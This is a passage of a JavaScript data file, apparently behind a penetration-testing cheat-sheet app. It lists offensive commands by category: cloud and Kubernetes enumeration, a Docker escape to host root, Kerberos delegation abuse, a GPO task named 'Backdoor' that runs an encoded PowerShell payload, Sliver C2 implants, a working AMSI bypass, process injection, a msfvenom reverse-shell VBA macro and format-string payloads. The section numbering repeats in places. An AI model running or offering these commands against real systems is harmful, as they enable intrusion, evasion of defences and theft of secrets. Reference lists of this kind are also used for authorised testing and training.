        title: 'Azure Tactics',
        commands: [
          { cmd: 'az login', desc: 'Log in to Azure CLI' },
          { cmd: 'az ad user list', desc: 'List Azure AD users' },
          { cmd: 'az account list', desc: 'Show subscriptions' },
          { cmd: 'az storage account list', desc: 'List storage accounts' },
          { cmd: 'Roadtools: roadrecon gather', desc: 'Gather Azure AD information' },
        ],
      },
      {
        title: 'GCP Tactics',
        commands: [
          { cmd: 'gcloud auth list', desc: 'Check authenticated GCP accounts' },
          { cmd: 'gcloud projects list', desc: 'List all GCP projects' },
          { cmd: 'gcloud compute instances list', desc: 'Enumerate GCP VMs' },
          { cmd: 'gcloud storage buckets list', desc: 'List Google Cloud Storage buckets' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 23. CONTAINER & K8S SECURITY
  // ═══════════════════════════════════════════════
  {
    id: 'containers',
    name: 'Containers & K8s',
    icon: '📦',
    description: 'Docker escapes, Kubernetes misconfigurations, and cluster auditing.',
    sections: [
      {
        title: 'Docker Analysis',
        commands: [
          { cmd: 'docker images', desc: 'List all local Docker images' },
          { cmd: 'docker ps -a', desc: 'List all containers (active/stopped)' },
          { cmd: 'docker inspect <ID>', desc: 'Deep dive into container metadata/env' },
          { cmd: 'docker exec -it <ID> /bin/bash', desc: 'Spawn shell inside container' },
          { cmd: 'docker run -v /:/mnt --rm -it alpine chroot /mnt', desc: 'Classic Docker socket escape (Host root access)' },
        ],
      },
      {
        title: 'Kubernetes Exploitation',
        commands: [
          { cmd: 'kubectl get nodes -o wide', desc: 'List all nodes in cluster' },
          { cmd: 'kubectl get pods --all-namespaces', desc: 'List all pods in all namespaces' },
          { cmd: 'kubectl get secrets --all-namespaces', desc: 'Enumerate K8s secrets' },
          { cmd: 'kubectl describe pod <POD>', desc: 'Get pod configuration details' },
          { cmd: 'kubectl auth can-i --list', desc: 'Check current RBAC permissions' },
          { cmd: 'kube-bench', desc: 'Automated K8s security benchmark' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 24. ADVANCED ACTIVE DIRECTORY
  // ═══════════════════════════════════════════════
  {
    id: 'ad-advanced',
    name: 'AD: Advanced',
    icon: '🛡️',
    description: 'Sophisticated Active Directory attacks, GPO abuse, and delegation exploitation.',
    sections: [
      {
        title: 'Delegation Attacks',
        commands: [
          { cmd: 'Get-DomainUser -TrustedToAuth', desc: 'Find users with Constrained Delegation' },
          { cmd: 'Get-DomainComputer -TrustedToAuth', desc: 'Find computers with Constrained Delegation' },
          { cmd: 'Rubeus.exe s4u /user:<USER> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:service/host /ptt', desc: 'Execute S4U2self/S4U2proxy attack' },
          { cmd: 'Get-DomainComputer -Unconstrained', desc: 'Find computers with Unconstrained Delegation' },
        ],
      },
      {
        title: 'GPO Abuse',
        commands: [
          { cmd: 'Get-DomainGPO -ComputerIdentity <NAME>', desc: 'Identify GPOs applied to a computer' },
          { cmd: 'New-GPOImmediateTask -TaskName "Backdoor" -Command "powershell.exe" -CommandArguments "-e <PAYLOAD>" -Force', desc: 'Create malicious GPO immediate task (PowerView)' },
          { cmd: 'Set-GPPermission -Name <GPO_NAME> -PermissionLevel GpoEdit -TargetName <USER>', desc: 'Grant GPO edit permissions' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 25. RED TEAM OPERATIONS & EDR EVASION
  // ═══════════════════════════════════════════════
  {
    id: 'red-team',
    name: 'Red Team & Evasion',
    icon: '🎭',
    description: 'Adversary emulation, C2 frameworks, and bypassing defensive controls.',
    sections: [
      {
        title: 'C2 Frameworks (Sliver)',
        commands: [
          { cmd: 'sliver-server', desc: 'Start Sliver C2 server' },
          { cmd: 'generate --mtls <IP> --save /tmp/shell.exe', desc: 'Generate mTLS implant' },
          { cmd: 'mtls', desc: 'Start mTLS listener' },
          { cmd: 'sessions', desc: 'List active beacon/session connections' },
          { cmd: 'use <ID>', desc: 'Interact with a specific implant' },
        ],
      },
      {
        title: 'EDR Evasion & AMSI Bypass',
        commands: [
          { cmd: "s_amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static'); s_amsi.SetValue($null,$true)", desc: 'Classic PowerShell AMSI bypass' },
          { cmd: 'Invoke-Obfuscation', desc: 'Launch PowerShell obfuscation framework' },
          { cmd: 'Find-AVSignature', desc: 'Locate AV signature in file' },
          { cmd: 'SharpBlock.exe -e cmd.exe -p <PID>', desc: 'Inject into process with ETW/AMSI blocking' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 24. MOBILE PENTESTING — ANDROID
  // ═══════════════════════════════════════════════
  {
    id: 'mobile-android',
    name: 'Mobile: Android',
    icon: '🤖',
    description: 'Android application analysis, ADB mastery, and runtime hooking.',
    sections: [
      {
        title: 'ADB Essentials',
        commands: [
          { cmd: 'adb devices', desc: 'List connected Android devices' },
          { cmd: 'adb shell', desc: 'Open remote shell on device' },
          { cmd: 'adb install <FILE.apk>', desc: 'Install APK to device' },
          { cmd: 'adb pull /data/data/<PKG>/databases/ db/', desc: 'Extract application database' },
          { cmd: 'adb logcat', desc: 'View system logs of device' },
        ],
      },
      {
        title: 'Reverse Engineering & Frida',
        commands: [
          { cmd: 'apktool d <FILE.apk>', desc: 'Decompile APK to smali' },
          { cmd: 'jadx-gui <FILE.apk>', desc: 'Decompile APK to Java code (GUI)' },
          { cmd: 'frida -U -f <PKG> -l script.js', desc: 'Inject Frida script into app' },
          { cmd: 'objection --gadget <PKG> explore', desc: 'Start Objection exploration' },
          { cmd: 'objection > android sslpinning disable', desc: 'Bypass SSL pinning with Objection' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 25. MOBILE PENTESTING — IOS
  // ═══════════════════════════════════════════════
  {
    id: 'mobile-ios',
    name: 'Mobile: iOS',
    icon: '🍎',
    description: 'iOS security auditing, keychain analysis, and jailbreak-based testing.',
    sections: [
      {
        title: 'iOS Enumeration',
        commands: [
          { cmd: 'iproxy 2222 22', desc: 'Forward local port to device SSH' },
          { cmd: 'ssh root@localhost -p 2222', desc: 'SSH into jailbroken iOS device' },
          { cmd: 'ps aux | grep <APP>', desc: 'Find running app process' },
          { cmd: 'ls -R /var/mobile/Containers/Data/Application/', desc: 'List iOS app data directories' },
        ],
      },
      {
        title: 'Exploitation Tools',
        commands: [
          { cmd: 'frida-ps -Uai', desc: 'List all applications on iOS device' },
          { cmd: 'keychain_dump', desc: 'Dump iOS keychain secrets' },
          { cmd: 'Cycript -p <PID>', desc: 'Inject Cycript into running process' },
          { cmd: 'clutch -i', desc: 'List apps available for decryption/cracking' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 26. INDUSTRIAL CONTROL SYSTEMS (ICS/SCADA)
  // ═══════════════════════════════════════════════
  {
    id: 'ics-scada',
    name: 'ICS & SCADA',
    icon: '🏭',
    description: 'Specialized protocols and exploitation for industrial infrastructure.',
    sections: [
      {
        title: 'ICS Enumeration',
        commands: [
          { cmd: 'nmap --script stuxnet-detect -p 102 <TARGET>', desc: 'Detect Siemens S7 PLCs' },
          { cmd: 'nmap --script modbus-discover -p 502 <TARGET>', desc: 'Discover Modbus devices' },
          { cmd: 'mbtget -v -a 1 -r 3 -n 10 <TARGET>', desc: 'Read Modbus registers' },
          { cmd: 's7client <TARGET>', desc: 'Interact with Siemens S7 PLC' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 27. IOT & HARDWARE HACKING
  // ═══════════════════════════════════════════════
  {
    id: 'iot-hardware',
    name: 'IoT & Hardware',
    icon: '🔌',
    description: 'Hardware interface exploitation, firmware dumping, and IoT analysis.',
    sections: [
      {
        title: 'Firmware & Binaries',
        commands: [
          { cmd: 'binwalk -e <FIRMWARE.bin>', desc: 'Extract files from firmware binary' },
          { cmd: 'fmu-extract <FIRMWARE.bin>', desc: 'Deep extract firmware components' },
          { cmd: 'qemu-system-arm -M <BOARD> -kernel <KERNEL>', desc: 'Emulate IoT device' },
        ],
      },
      {
        title: 'Hardware Interfaces',
        commands: [
          { cmd: 'flashrom -p ch341a_spi -r backup.bin', desc: 'Dump SPI flash via CH341A' },
          { cmd: 'screen /dev/ttyUSB0 115200', desc: 'Connect to UART serial console' },
          { cmd: 'baudrate -p /dev/ttyUSB0', desc: 'Auto-detect serial baud rate' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 28. SOCIAL ENGINEERING & PHISHING
  // ═══════════════════════════════════════════════
  {
    id: 'social-engineering',
    name: 'Social Engineering',
    icon: '🎭',
    description: 'Human-centric attacks, phishing frameworks, and payload delivery.',
    sections: [
      {
        title: 'SET (Social-Engineer Toolkit)',
        commands: [
          { cmd: 'sudo setoolkit', desc: 'Launch SET' },
          { cmd: 'SET > 1) Social-Engineering Attacks', desc: 'Select SE attack category' },
          { cmd: 'SET > 2) Website Attack Vectors', desc: 'Select credential harvester' },
        ],
      },
      {
        title: 'Phishing Payloads',
        commands: [
          { cmd: 'gophish', desc: 'Launch GoPhish admin console' },
          { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_https ... -f vba', desc: 'Generate malicious VBA macro' },
        ],
      },
    ],
  },

  // ═══════════════════════════════════════════════
  // 29. ADVANCED BINARY EXPLOITATION
  // ═══════════════════════════════════════════════
  {
    id: 'bin-exploit-adv',
    name: 'Binary: Advanced',
    icon: '💣',
    description: 'Deep stack/heap exploitation, ROP chains, and bypass techniques.',
    sections: [
      {
        title: 'ROP & ASLR Bypass',
        commands: [
          { cmd: 'ROPGadget --binary <ELF> --ropchain', desc: 'Auto-generate ROP chain' },
          { cmd: 'one_gadget <LIBC>', desc: 'Find magic "one gadget" for execve' },
          { cmd: 'x/gx $rbp-0x10', desc: 'Examine stack frame pointers' },
        ],
      },
      {
        title: 'Format String Attacks',
        commands: [
          { cmd: 'python3 -c "print(\'%p.\'*20)" | ./binary', desc: 'Leak memory via format string' },
          { cmd: 'python3 -c "print(\'%s.\'*10)" | ./binary', desc: 'Leak strings from stack' },
          { cmd: 'python3 -c "print(p32(<ADDR>) + b\'%13$n\')"', desc: 'Write to memory via %n' },
        ],
      },
    ],
  },
];
